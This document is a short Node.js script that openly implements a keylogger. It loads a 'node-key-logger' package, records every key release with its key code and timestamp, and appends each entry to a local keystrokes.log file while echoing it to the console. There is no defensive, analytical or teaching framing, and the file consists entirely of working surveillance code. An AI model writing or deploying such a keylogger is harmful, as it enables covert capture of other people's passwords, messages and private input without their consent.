const { KeyLogger } = require('node-key-logger');
const fs = require('fs');

// Create a new KeyLogger instance
const keylogger = new KeyLogger();

// Function to log keystrokes to a file
function logKeystrokes(keyData) {
  fs.appendFile('keystrokes.log', keyData + '\n', (err) => {
    if (err) throw err;
  });
}

// Listen for keyboard events
keylogger.on('keyup', (event) => {
  const { keyCode, key, timestamp } = event;
  const logData = `Key: ${key} (KeyCode: ${keyCode}), Timestamp: ${timestamp}`;
  console.log(logData); // Log to console (optional)
  logKeystrokes(logData); // Log to file
});

console.log('Keylogger started...'); // Console message to indicate the keylogger has started
